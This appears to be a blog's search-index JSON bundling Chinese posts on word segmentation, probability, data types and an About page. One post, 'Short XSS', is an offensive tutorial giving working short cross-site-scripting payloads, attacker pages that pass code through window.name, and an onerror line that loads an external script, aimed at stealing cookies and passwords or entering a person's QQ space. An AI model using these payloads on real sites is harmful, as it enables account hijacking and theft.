if(\u0026#39;/%s\u0026#39;%cut not in sentence and \u0026#39;%s/\u0026#39;%cut not in sentence and cut in sentence) : sentence = sentence.replace(cut, \u0026#39;/%s/\u0026#39;%cut) print(sentence) #/独立自主/和/平等互利/的/原则 参考文档 https://www.cnblogs.com/cyandn/p/10891608.html https://zhuanlan.zhihu.com/p/103392455 http://www.matrix67.com/blog/archives/4212 https://kexue.fm/archives/3908 ","permalink":"https://vec6.com/posts/chinesecutwords-1/","summary":"中文分词是指将文本拆分为单词的过程，而结果集合连接起来是等于原始的文本，而中文分词一直作为NLP领域的比较重要的领域，而大多数的文本挖掘都是以分词为基础，但中文不同于英文，英文每个单词是用空格分隔，整体语义上相对于中文难度低很多。 而业务上一直有中文分词的需求，但是之前因为在忙于另外一个项目，所以一直没有研究。 近期稍空闲开始研究了相关的中文分词算法，发现中文分词总体算比较成熟，但是其中对于未登录词或者某个特定专业领域文本大部分算法分词的结果不尽人意，需要结合多种算法或者人工词典才能达到稍微好一点的效果。 中文分词的方式一共有两种，分别为：\n词典分词：如正向最大匹配算法、反向最大匹配算法、双向最大匹配算法、最少词数法等 字标注分词：如HMM（隐马尔可夫）模型等 而这几种方式很难说出谁好谁坏，比如词典分词的方式速度非常快，但对于未登录词的识别又不太好，而HMM和Pkuseg都能识别部分未登录词，但是运行速度又降下来了，这对于在实际应用场景当中是非常致命的问题，所以最大的优解就是集各家所长，比如结巴分词就使用了词典分词算法识别能识别的词，而不能识别的则继续使用了HMM模型来处理。\n词典分词 基于词典的分词算法实际上就是对于类似字典的数据结构进行查询，对于未在词典内的词识别较弱和交集型歧义理解能力也较弱，比如“结婚的和尚未结婚的”，理想的情况是\u0026quot;结婚/的/和/尚未/结婚/的\u0026quot;，而实际中则会被分词为\u0026quot;结婚/的/和尚/未/结婚/的\u0026quot;。 但好在词典分词的速度则非常快，词典分词目前已有非常成熟高效的解决方案，并且有非常多的工具来帮你实现相关的高效数据结构和查询方式，比如Trie树和AC自动机，但在这里为了方便理解和记录，只采用了尽可能简单的方式来记录其几种算法的实现和原理。\n正向最大匹配算法（Forward Maximum Matching） 正向最大匹配算法类似于人的阅读习惯，即从左到右进行识别，而其中的\u0026quot;最大\u0026quot;是基于词典中最长字符的长度作为最大的匹配宽度，然后每次根据这个宽度对文本进行切分并取出来查询词典。如果当前取出来的词能在词典当中查询当则返回，并下一次切分的开始位置为该词的位置+1。而如果当前取出的部分没有在词典中查找到，则将该部分去掉最后一个字符后再进行查找，一直重复直到匹配到了词典中的词。如果整个部分只剩余一个字符，并没有匹配到词典中的词，则将最后剩余的这个字符输出，然后根据这个字符的位置+1开始再次进行切分和查询。 比如，有一段文本\u0026quot;中文分词算法\u0026quot;，字典中只包含了一个词\u0026quot;分词\u0026quot;，这个时候最大的匹配宽度也为2，所以整段文本按照2个字符进行切分。第一次得到\u0026quot;中文\u0026quot;文本，查找词典并无该词，则在该部分上去掉最后的字符，得到\u0026quot;中\u0026quot;，再次查询词典并无该词，此时查找结束，所以不需要再进行匹配，则这个切分记为[\u0026ldquo;中\u0026rdquo;]。 继续进行第二次切分，得到的文本为\u0026quot;文分\u0026quot;，进行查询词典，第一次查询\u0026quot;文分\u0026quot;在字典中不存在，去掉最后一个字符，继续以剩余部分\u0026rsquo;文\u0026rsquo;查询第二次，未查询到，那么返回最后这个字符\u0026quot;文\u0026quot;，加上次的结果记作[\u0026ldquo;中\u0026rdquo;,\u0026ldquo;文\u0026rdquo;] 继续第三次切分，得到文本\u0026quot;分词\u0026quot;，进行查询词典，查询到该词在字典当中，所以直接记录在之前的结果当中，记作[\u0026ldquo;中\u0026rdquo;, \u0026ldquo;文\u0026rdquo;, \u0026ldquo;分词\u0026rdquo;]。 继续第四次切分，得到文本\u0026quot;算法\u0026quot;，进行查询字典，第一次查询\u0026quot;算法\u0026quot;在字典中不存在，去掉最后一个字符，继续以剩余部分\u0026rsquo;算\u0026rsquo;查询第二次，未查询到，那么返回最后这个字符\u0026quot;算\u0026quot;，加上次的结果记作[\u0026ldquo;中\u0026rdquo;, \u0026ldquo;文\u0026rdquo;, \u0026ldquo;分词\u0026rdquo;, \u0026ldquo;算\u0026rdquo;] 继续第五次切分，因为最后只剩余一个字符，所以这个时候可以不进行匹配即返回，所以最终的结果为[\u0026ldquo;中\u0026rdquo;, \u0026ldquo;文\u0026rdquo;, \u0026ldquo;分词\u0026rdquo;, \u0026ldquo;算\u0026rdquo;, \u0026ldquo;法\u0026rdquo;] 整体分词的过程本质对每个分块进行查找，并依次去掉最后字符查询，而网上还有一部分是没有使用最大宽度切分，即会对每个字符到文本结束的位置都会依次遍历，这样的方式实际上会浪费较多的资源，因为即使从头到尾依次遍历匹配，但最长词的长度是固定的，所以真正开始匹配还是从最长词的长度开始，而其余的遍历都是浪费了资源。 正向最大匹配算法具体的实现代码：\nsentence = \u0026#39;中文分词算法\u0026#39; # 输入的句子 cutList = [\u0026#39;分词\u0026#39;] # 分词词典 start = 0 #设置切分起始位置 maxWidth = len(max(cutList, key=len)) # 得到字典当中最大的切分宽度 cut_result = [] # 设置一个空的分词结果 while (start \u0026lt;= len(sentence)): #开始循环，如果start大于等于句子长度则停止分词 end = start + maxWidth # 计算每次切分的停止位置 word = sentence[start: end] # 开始切分，文本为变量start和end的区间内字符 while ( word ) : # python对于空字符串会转换为False if ( word in cutList ) : # 查看第一次切分后是否能在词典中匹配，如果匹配则放入最终的分词结果列表cut_result,并跳出循环 cut_result.","title":"(一)漫话中文分词：最大匹配,双向最大,最小词数"},{"content":"样本空间（Ω） 样本空间通常指实验或随机所有可能的集合，我们常在说一个概率的时候，实际上是默认忽略掉了样本空间，比如说事件A的概率，实际上指样本空间中，事件A的数量与样本空间的占比。\n比如丢硬币，硬币只有正面和反面，那么硬币的样本空间则为 ${正面，反面}$，这个时候常说的正面的概率为二分之一，实际指的是正面事件的数量与样本空间的占比，也就是1/2。 再比如说丢骰子，一个骰子有6种可能，分别对应1-6不同的数值，那么丢骰子的样本空间则为${1，2，3，4，5，6}$，这个时候丢到5个事件概率则为数字5在样本空间出现的次数与样本空间总数的占比。\n独立事件 独立事件是指不受过去已发生的事件而影响的事件，典型的例子就是抛硬币，不管你抛多少次硬币始终正面或反面的概率为0.5，而该硬币的样本空间如下：\n独立事件的概率计算公式为如下：\n$$ 事件发生的概率(P) = 事件在样本空间中的数量 / 样本空间的事件总数 $$\n比如用抛硬币的例子，计算正面的概率则为：\n而除了单个独立事件，有些时候也会求多个独立事件的概率，而多个独立事件的概率则是每个独立事件发生的概率的积。 比如掷3次骰子都为6的概率是多少？需要注意因为掷骰子是一个独立事件，即每次掷的骰子样本空间都一样，并且没有因为第一次掷骰子的结果会影响到下一次。 骰子的样本空间为下，从中能够得到单次掷骰子为6的概率为1/6：\n而这个时候只需要将三次掷骰子的概率相乘就得到了三次都为6的概率：\n相关事件 相关事件和独立事件是相对的，相关事件的发生概率会受到过去已发生事件的影响，每个事件都和上一个事件有关联，这些事件便是相关的。 比如一个布袋中有5个球，其中包含2个蓝球，三个红球，布袋(样本空间)则为：\n这个时候如果随机拿一颗蓝球的概率是多少？概率为2/5。 但是此时求第二次拿到蓝球的概率是多少？这个时候就会有两种情况发生：\n第一次拿到红球，这个时候整个样本空间少了一个红球，所以第二次拿到蓝球的概率为2/4 第二次拿到蓝球，这个时候整个样本空间少了一个篮球，所以第二次拿到蓝球的概率为1/4 用图表示则为：\n所以此时，如果算第一次拿到红球后，第二次拿到蓝球的概率则为：\n如果算第一次拿到蓝球后，第二次拿到红球的概率则为：\n条件概率 条件概率是研究相关事件的，指的是当B事件发生后，A事件发生的概率，用\u0026quot;｜\u0026ldquo;来表示\u0026quot;以下发生的条件下\u0026rdquo;，表示为公式：\n比如上面的例子，第二个蓝球的概率是多少，这个问题就是条件概率，因为第二次抽中蓝球的概率是基于第一次拿了一颗球过后发生的事件。 这个时候可以将第一次抽中红球记作事件A，第二次抽蓝球为事件B，因为第二次抽球是在事件A发生的情况下而发生的，所以记作 $P(B|A)$ ，表示在A发生后，B发生的概率。 而这个概率可以根据下图来得到，即2/4：\n这里的条件概率本质是二级概率，该情况可以用图来表达，第一次抽球的样本空间为整个样本空间：\n当第一次抽球(A事件)发生后，B事件的样本空间则是基于A事件发生后的样本空间，即下图中A圆圈内的样本空间：\n联合概率 联合概率指两个事件共同发生的概率，比如A和B事件共同发生的概率表示为：\n联合概率的计算分为两种情况，一种为独立事件，比如前面掷骰子，计算公式则为多个独立事件事件的积，表示为：\n另一种则为相关事件，比如上面的抽球的例子，则可以通过反推来计算，表示为：\n这里这样计算是因为P(B|A)只得到了B在A发生后的概率，也就是在发生后的样本空间上计算的，所以P(B|A)表示的只有下图这么一部分发生的概率：\n而在这个时候乘以P(A)的概率，则就能表示如下这整个部分：\n全概率 导致一个事件发生的原因有很多种，那么该事件发生的概率就是每种原因引起该事件发生的概率总和，这句话能够很好的解释全概率。 而全概率公式就可以计算出一个事件的全部概率，公式为：\n而根据联合概率的计算方法，可以写成下面这样：\n还是拿红蓝球的例子来说，如果需要计算P(B)，这个时候可以利用全概率公式，则将能引起事件B发生的每个概率相加，即可得到P(B)。 在红篮球例子当中，引起事件B的原因有两种，分别为：先拿到红球，然后抽中蓝球的概率和先拿到蓝球抽中蓝球的概率。 根据图中第一种先拿到了红球引起B事件的发生的概率为 $(3/5) * (2/4) = 0.3$\n根据图中第二种先拿到了蓝球引起B事件的发生的概率为 $(2/5) * (1/4) = 0.1 $\n这个时候得到了所有能引起B事件发生的原因的概率，所以：\n$$ P(B) = 0.3 + 0.1 = 0.4 $$\n条件概率和朴素贝叶斯定理公式 在理解了上面的几个知识点后，就能够理解贝叶斯和条件概率的计算方式。 条件概率的计算公式为：\n而贝叶斯公式则可以用条件概率公式和联合概率公式推导出来：\n参考文档 https://zhuanlan.zhihu.com/p/134036707 https://blog.csdn.net/u013371163/article/details/60469065 https://www.shuxuele.com/data/probability-events-conditional.html https://www.shuxuele.com/data/probability-events-independent.html https://www.shuxuele.com/data/probability-events-types.html https://www.zhihu.com/question/264373830/answer/613608291 https://blog.csdn.net/u013371163/article/details/60469065 https://zhuanlan.zhihu.com/p/78297343 ","permalink":"https://vec6.com/posts/learning-conditional-probability/","summary":"样本空间（Ω） 样本空间通常指实验或随机所有可能的集合，我们常在说一个概率的时候，实际上是默认忽略掉了样本空间，比如说事件A的概率，实际上指样本空间中，事件A的数量与样本空间的占比。\n比如丢硬币，硬币只有正面和反面，那么硬币的样本空间则为 ${正面，反面}$，这个时候常说的正面的概率为二分之一，实际指的是正面事件的数量与样本空间的占比，也就是1/2。 再比如说丢骰子，一个骰子有6种可能，分别对应1-6不同的数值，那么丢骰子的样本空间则为${1，2，3，4，5，6}$，这个时候丢到5个事件概率则为数字5在样本空间出现的次数与样本空间总数的占比。\n独立事件 独立事件是指不受过去已发生的事件而影响的事件，典型的例子就是抛硬币，不管你抛多少次硬币始终正面或反面的概率为0.5，而该硬币的样本空间如下：\n独立事件的概率计算公式为如下：\n$$ 事件发生的概率(P) = 事件在样本空间中的数量 / 样本空间的事件总数 $$\n比如用抛硬币的例子，计算正面的概率则为：\n而除了单个独立事件，有些时候也会求多个独立事件的概率，而多个独立事件的概率则是每个独立事件发生的概率的积。 比如掷3次骰子都为6的概率是多少？需要注意因为掷骰子是一个独立事件，即每次掷的骰子样本空间都一样，并且没有因为第一次掷骰子的结果会影响到下一次。 骰子的样本空间为下，从中能够得到单次掷骰子为6的概率为1/6：\n而这个时候只需要将三次掷骰子的概率相乘就得到了三次都为6的概率：\n相关事件 相关事件和独立事件是相对的，相关事件的发生概率会受到过去已发生事件的影响，每个事件都和上一个事件有关联，这些事件便是相关的。 比如一个布袋中有5个球，其中包含2个蓝球，三个红球，布袋(样本空间)则为：\n这个时候如果随机拿一颗蓝球的概率是多少？概率为2/5。 但是此时求第二次拿到蓝球的概率是多少？这个时候就会有两种情况发生：\n第一次拿到红球，这个时候整个样本空间少了一个红球，所以第二次拿到蓝球的概率为2/4 第二次拿到蓝球，这个时候整个样本空间少了一个篮球，所以第二次拿到蓝球的概率为1/4 用图表示则为：\n所以此时，如果算第一次拿到红球后，第二次拿到蓝球的概率则为：\n如果算第一次拿到蓝球后，第二次拿到红球的概率则为：\n条件概率 条件概率是研究相关事件的，指的是当B事件发生后，A事件发生的概率，用\u0026quot;｜\u0026ldquo;来表示\u0026quot;以下发生的条件下\u0026rdquo;，表示为公式：\n比如上面的例子，第二个蓝球的概率是多少，这个问题就是条件概率，因为第二次抽中蓝球的概率是基于第一次拿了一颗球过后发生的事件。 这个时候可以将第一次抽中红球记作事件A，第二次抽蓝球为事件B，因为第二次抽球是在事件A发生的情况下而发生的，所以记作 $P(B|A)$ ，表示在A发生后，B发生的概率。 而这个概率可以根据下图来得到，即2/4：\n这里的条件概率本质是二级概率，该情况可以用图来表达，第一次抽球的样本空间为整个样本空间：\n当第一次抽球(A事件)发生后，B事件的样本空间则是基于A事件发生后的样本空间，即下图中A圆圈内的样本空间：\n联合概率 联合概率指两个事件共同发生的概率，比如A和B事件共同发生的概率表示为：\n联合概率的计算分为两种情况，一种为独立事件，比如前面掷骰子，计算公式则为多个独立事件事件的积，表示为：\n另一种则为相关事件，比如上面的抽球的例子，则可以通过反推来计算，表示为：\n这里这样计算是因为P(B|A)只得到了B在A发生后的概率，也就是在发生后的样本空间上计算的，所以P(B|A)表示的只有下图这么一部分发生的概率：\n而在这个时候乘以P(A)的概率，则就能表示如下这整个部分：\n全概率 导致一个事件发生的原因有很多种，那么该事件发生的概率就是每种原因引起该事件发生的概率总和，这句话能够很好的解释全概率。 而全概率公式就可以计算出一个事件的全部概率，公式为：\n而根据联合概率的计算方法，可以写成下面这样：\n还是拿红蓝球的例子来说，如果需要计算P(B)，这个时候可以利用全概率公式，则将能引起事件B发生的每个概率相加，即可得到P(B)。 在红篮球例子当中，引起事件B的原因有两种，分别为：先拿到红球，然后抽中蓝球的概率和先拿到蓝球抽中蓝球的概率。 根据图中第一种先拿到了红球引起B事件的发生的概率为 $(3/5) * (2/4) = 0.3$\n根据图中第二种先拿到了蓝球引起B事件的发生的概率为 $(2/5) * (1/4) = 0.1 $\n这个时候得到了所有能引起B事件发生的原因的概率，所以：\n$$ P(B) = 0.3 + 0.","title":"理解条件概率"},{"content":"统计学中，将一种类型的数据总称为变量，而变量的数据称为观测，而变量的具体取值为观测值，比如下面的数据中，age和name都是变量，而18和’大红’都具体的取值被称为观测值。\nage,name 18,’大红’ 21,’小花’ 同理，在统计学中，离散数据也被称为离散变量，连续数据也被称为连续变量，而如何区分两种变量的区别？ 连续变量可以理解为取值范围在理论上是连续不断的，而离散变量则可以理解为取值范围是间断不连续的，他们之间的区别并无数量之分，都是无穷个。 比如家庭数量人口只有1、2、3、4个人口，不可能为1.2、1.8、2.4这样来表示人口，所以家庭人口是离散变量。 而年龄取值上通常为了方便而说是18岁、17岁、30岁，但是如果按照实际取值，则可以取为18.32、17.55、30.67岁，17.55岁则表示年龄为17岁6个月18天，而且出生的时间还可以精确到小时、分、秒等单位，所以年龄为连续变量。\n参考资料 关于连续和离散的理解 定量和定性变量、连续和离散变量，到底怎么分？ 图解概率笔记：葉丙成概率公开课 ","permalink":"https://vec6.com/posts/continuous-data-and-discrete-data/","summary":"统计学中，将一种类型的数据总称为变量，而变量的数据称为观测，而变量的具体取值为观测值，比如下面的数据中，age和name都是变量，而18和’大红’都具体的取值被称为观测值。\nage,name 18,’大红’ 21,’小花’ 同理，在统计学中，离散数据也被称为离散变量，连续数据也被称为连续变量，而如何区分两种变量的区别？ 连续变量可以理解为取值范围在理论上是连续不断的，而离散变量则可以理解为取值范围是间断不连续的，他们之间的区别并无数量之分，都是无穷个。 比如家庭数量人口只有1、2、3、4个人口，不可能为1.2、1.8、2.4这样来表示人口，所以家庭人口是离散变量。 而年龄取值上通常为了方便而说是18岁、17岁、30岁，但是如果按照实际取值，则可以取为18.32、17.55、30.67岁，17.55岁则表示年龄为17岁6个月18天，而且出生的时间还可以精确到小时、分、秒等单位，所以年龄为连续变量。\n参考资料 关于连续和离散的理解 定量和定性变量、连续和离散变量，到底怎么分？ 图解概率笔记：葉丙成概率公开课 ","title":"理解连续数据和离散数据"},{"content":"文章作者：xsscript(原网名Crackkay)\n0x00 背景 关键时候长度不够怎么办？\n在实际的情况中如果你不够长怎么办呢？看医生？吃药？做手术？。。。。。。。。。。。。。。算了，既然自身硬件不足，那么就把缺点变优点吧。熟话说：小是小威力好。\n熟话说的好，要能长能短，收放自如。在很多的情况中，我们构造的语句是被限制在一定的字符数内。所以这个就是考验你能短的时候能不能短，能长的时候能不能长的时候到了。\n0x01 现实中的悲剧 这是一个活生生的悲剧，一个平台上面，一个二逼朋友有妹子的平台账号，但是二逼朋友想进妹子的QQ空间，用平台的备注插QQ-XSS代码，但是因为限制的字符太短，最终抱头痛哭。于是就有了下图所发生：\n0x02 怎么变”短” \u0026quot;\u0026gt;alert(1)\n\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;..27 letters?\nAlert(1)? No Run? Impossible? No! 在实际情况中，可以通过短向量或者其他的短向量去测试存在XSS的地方，为什么可以这样？HTML是一门”不太严格”的解释语言，即使没有，很多浏览器也照样可以解释为\n\u0026lt;h1\u0026gt;xss 可以解释为: \u0026lt;h1\u0026gt;xss\u0026lt;/h1\u0026gt; S1:\nS2:\nS3：\n但是如果在攻击的时候，我往往需要用到很多标签、属性来达到我们的目的。下面列出一些比较猥琐的利用\n\u0026lt;svg/onload=domain=id\u0026gt;\nS1:在chrome浏览器存在一个同域读取漏洞，为什么说同域呢？\nS2:在chrome下如果我们访问www.baidu.com，通过控制台来设置一下域为空，document.domain=\u0026quot;\u0026quot;，就会出现以下的错误。\nS3:为什么说chrome浏览器存在一个同域读取漏洞呢?下面我们通过访问www.baidu.com.来访问一下（com后面还有一个.）并设置一下域为空\ndocument.domain=\u0026quot;\u0026quot;设置结果就会出现以下图片所示。\nS4:这个怎么利用？\n首先说一个问题，就是说，在同域的情况下，DOM是互通的。就相当于我a可以写b的，b也可以同样写a的。那我们该怎么来利用呢？我们可以干很多事情，比如说重写页面钓鱼，或者盗取同域Cookie。下面我就用Chrome的控制台来演示一下这个内容读取漏洞。\nS5:先来看看两段代码：\n本地构造的攻击页面如下：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;这是a.com./12.html\u0026lt;/h1\u0026gt; \u0026lt;svg/onload=domain=id\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 存在缺陷的XSS页面如下：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;这是b.com./11.html\u0026lt;/h1\u0026gt; \u0026lt;svg/onload=domain=id\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; S6:下面我们通过访问我们构造的攻击页面，也就是a.com./12.html，然后读取domain看看，结果如下图：\nS7:然后我们在控制台里面用window.open()方法打开打开存在缺陷的XSS页面.然后同样用domain查看域.\nS8:我们从上面就可以查看出，现在a.com.和b.com.都是处于同一域下面，那么就可以实现DOM相通的概念了。\nS9:通过DOM重写页面测试，测试结果如下图：\nS10:其实这个方法的用处很多，比如说我找到XXX的XSS页面，我通过把域置空，然后在自己站上构造一个页面，怎么构造就要看你的思维了，通过同域的DOM操作，可以钓鱼的方式盗取COOKIE、密码等。\n\u0026lt;svg/onload=eval(name)\u0026gt;\nS1:先把代码文译一下：\n\u0026lt;svg/onload=eval(window.name)\u0026gt;\nS2:这一段代码通过svg载入的时候执行onload事件，执行的时候通过windows.name传递给eval执行，如果我们自己构造一个攻击页面，然后传递的XSS代码呢？下面看一段代码：\n本地构造的攻击页面：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; [http://11.html](http://11.html) \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 存在缺陷的XSS页面：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;svg/onload=eval(name)\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; S3:然后运行页面，测试结果如下：\n\u0026lt;i/onclick=URL=name\u0026gt;\nS1:上面的代码文译一下：\n\u0026lt;i/onclick=document.URL=window.name\u0026gt;\nS2:其实这段代码和上一段差不多多少，这里就不截图了，简单的讲解一下。通过点击执行事件把window.name的内容给document.URL然后执行javascript代码。那么我们可以怎么利用呢？\n存在缺陷的XSS页面如下：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;i/onclick=URL=name\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 本地构造的攻击页面如下：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; [http://11.html](http://11.html) \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;img src=x onerror=eval(name)\u0026gt; S1:先把代码文译一下：\n\u0026lt;img src=x onerror=eval(window.name)\u0026gt;\nS2:邪恶的eval又来了。通过img元素的src属性出错，执行onerror事件，通过邪恶的eval执行window.name里面的代码。\nS3:那我们怎么来实现呢？\n本地构造的攻击页面如下：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; [http://11.html](http://11.html) \u0026lt;/body\u0026gt; 站长统计 存在缺陷的XSS页面如下： \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;img src=\u0026#34;s.sx\u0026#34; onerror=eval(name) /\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 其实有很多用法，当然你也可以直接:\n\u0026lt;img src=x onerror=eval(alert(1)) /\u0026gt;\n还可以\n\u0026lt;img src=x onerror=eval(变量) /\u0026gt;\n还可以通过调用元素属性，或者是程序员自写的js代码\n\u0026lt;img src=x onerror=with(body)createElement(\u0026#39;script\u0026#39;).src=\u0026#39;[JS地址]\u0026#39;\u0026gt; S1:通过img元素的src属性出错，执行onerror事件.\nS2:用with定位到body，通过DOM的一个createElement方法创建一个script元素，并使用script的src属性指向需要调用的外部js文件。从而达到攻击的目的。\nS3:这个就不讲解了，都应该能够看懂\n0x03 实例\n下面引用长谷川的PPT的一部分（此PPT引用经过作者同意）\n通过查看源代码：\n地址：\nhttps://*.live.com/?param=\u0026gt;\u0026lt;h1\u0026gt;XSSed\u0026lt;/h1\u0026gt;\u0026lt;!--#!html \u0026lt;!-- Version: \u0026#34;13.000.20177.00\u0026#34; Server: BAYIDSLEG1C38; DateTime: 2012/05/01 15:13:23 --\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; value=\u0026#34;MESSAGE: A potentially dangerous Request.QueryString value was detected from the client (param=\u0026#34;\u0026gt;\u0026lt;h1\u0026gt;XSSed\u0026lt;/h1\u0026gt;\u0026lt;!--\u0026#34;). SOURCE: System.Web FORM:\u0026#34; /\u0026gt; 找出了XSS的原因是由错误消息引起的XSS\n然后通过攻击者自己构造的页面构造XSS，并成功实现。\n\u0026lt;iframe src=\u0026#34;target\u0026#34; name=\u0026#34;javascript:alert(1)\u0026#34;\u0026gt; （或者使用JavaScript的window.open） 最终：作者通过21个字符实现XSS（关于实现的方法请见上面的一些比较猥琐的利用元素标签）\n代码为：\n\u0026gt;\u0026lt;i/onclick=URL=name\u0026gt; 当然22个字符也有很多方法(//后面为我们构造的代码开始) 20 Letters \u0026lt;input type=hidden value=//\u0026gt;\u0026lt;i/onclick=URL=name\u0026gt; 22 Letters \u0026lt;input type=hidden value=\u0026#34;//\u0026#34;\u0026gt;\u0026lt;i/onclick=URL=name\u0026gt;\u0026#34;\u0026gt; 17 Letters \u0026lt;input type=text value= //onclick=URL=name\u0026gt; 0x04 挑战最”短”\n这个活动是国外一个网站发布的，名为XSS challenge，大家有兴趣可以讨论一下\n19 Letters\n\u0026lt;x/x=\u0026amp;{eval(name)}; 22 Letters\n\u0026lt;svg/onload=eval(name) 最短的javascript执行代码，考验你”短”的时候到了\n10 Letters eval(name) 9 Letters eval(URL) 8 Letters URL=name 6 Letters $(URL) 0x05 总结\nJavascript是一门很好玩的解释型语言，每次去研究这些XSS点的时候会有很多乐趣，你越不相信这个点有XSS，那么就越要去研究这个点是否有XSS。\n其实呢~~~这些技术可以称为猥琐流。。。因为不是按正常的逻辑思维是想不到这些的，除非那些思想很猥琐的人。\n欢迎你加入猥琐这个团队，让我们一起猥琐吧。\n","permalink":"https://vec6.com/posts/short-xss/","summary":"文章作者：xsscript(原网名Crackkay)\n0x00 背景 关键时候长度不够怎么办？\n在实际的情况中如果你不够长怎么办呢？看医生？吃药？做手术？。。。。。。。。。。。。。。算了，既然自身硬件不足，那么就把缺点变优点吧。熟话说：小是小威力好。\n熟话说的好，要能长能短，收放自如。在很多的情况中，我们构造的语句是被限制在一定的字符数内。所以这个就是考验你能短的时候能不能短，能长的时候能不能长的时候到了。\n0x01 现实中的悲剧 这是一个活生生的悲剧，一个平台上面，一个二逼朋友有妹子的平台账号，但是二逼朋友想进妹子的QQ空间，用平台的备注插QQ-XSS代码，但是因为限制的字符太短，最终抱头痛哭。于是就有了下图所发生：\n0x02 怎么变”短” \u0026quot;\u0026gt;alert(1)\n\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;..27 letters?\nAlert(1)? No Run? Impossible? No! 在实际情况中，可以通过短向量或者其他的短向量去测试存在XSS的地方，为什么可以这样？HTML是一门”不太严格”的解释语言，即使没有，很多浏览器也照样可以解释为\n\u0026lt;h1\u0026gt;xss 可以解释为: \u0026lt;h1\u0026gt;xss\u0026lt;/h1\u0026gt; S1:\nS2:\nS3：\n但是如果在攻击的时候，我往往需要用到很多标签、属性来达到我们的目的。下面列出一些比较猥琐的利用\n\u0026lt;svg/onload=domain=id\u0026gt;\nS1:在chrome浏览器存在一个同域读取漏洞，为什么说同域呢？\nS2:在chrome下如果我们访问www.baidu.com，通过控制台来设置一下域为空，document.domain=\u0026quot;\u0026quot;，就会出现以下的错误。\nS3:为什么说chrome浏览器存在一个同域读取漏洞呢?下面我们通过访问www.baidu.com.来访问一下（com后面还有一个.）并设置一下域为空\ndocument.domain=\u0026quot;\u0026quot;设置结果就会出现以下图片所示。\nS4:这个怎么利用？\n首先说一个问题，就是说，在同域的情况下，DOM是互通的。就相当于我a可以写b的，b也可以同样写a的。那我们该怎么来利用呢？我们可以干很多事情，比如说重写页面钓鱼，或者盗取同域Cookie。下面我就用Chrome的控制台来演示一下这个内容读取漏洞。\nS5:先来看看两段代码：\n本地构造的攻击页面如下：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;这是a.com./12.html\u0026lt;/h1\u0026gt; \u0026lt;svg/onload=domain=id\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 存在缺陷的XSS页面如下：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;这是b.com./11.html\u0026lt;/h1\u0026gt; \u0026lt;svg/onload=domain=id\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; S6:下面我们通过访问我们构造的攻击页面，也就是a.com./12.html，然后读取domain看看，结果如下图：\nS7:然后我们在控制台里面用window.open()方法打开打开存在缺陷的XSS页面.然后同样用domain查看域.\nS8:我们从上面就可以查看出，现在a.com.和b.com.都是处于同一域下面，那么就可以实现DOM相通的概念了。\nS9:通过DOM重写页面测试，测试结果如下图：\nS10:其实这个方法的用处很多，比如说我找到XXX的XSS页面，我通过把域置空，然后在自己站上构造一个页面，怎么构造就要看你的思维了，通过同域的DOM操作，可以钓鱼的方式盗取COOKIE、密码等。\n\u0026lt;svg/onload=eval(name)\u0026gt;\nS1:先把代码文译一下：\n\u0026lt;svg/onload=eval(window.name)\u0026gt;\nS2:这一段代码通过svg载入的时候执行onload事件，执行的时候通过windows.name传递给eval执行，如果我们自己构造一个攻击页面，然后传递的XSS代码呢？下面看一段代码：\n本地构造的攻击页面：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; [http://11.html](http://11.html) \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 存在缺陷的XSS页面：","title":"Short XSS"},{"content":" 出生于四川，90后生人，不抽烟，偶尔喝酒，目前居住四川成都。 毕业于重庆大学（非统招）工程造价管理专业，目前从事反网络犯罪的数据分析工作。 喜欢折腾家用的路由设备、NAS，目前理财小白一名。 公司经历\n2018年-至今：就职于成都无糖信息技术有限公司，负责反网络犯罪研究与情报研究。 项目经历\n“重明”情报系统：基于大量的黑灰产的多种数据通过机器学习进行信息识别、提取、分类，并将信息组织和关联，最终形成一个情报检索系统。 “网络犯罪趋势报告”：国内最早由企业从情报视角研究网络犯罪相关手法、产业链的白皮书，参与了第一版主导和编辑工作。 ","permalink":"https://vec6.com/about/","summary":"about","title":"About"},{"content":"","permalink":"https://vec6.com/posts/","summary":"posts","title":"New Posts"}]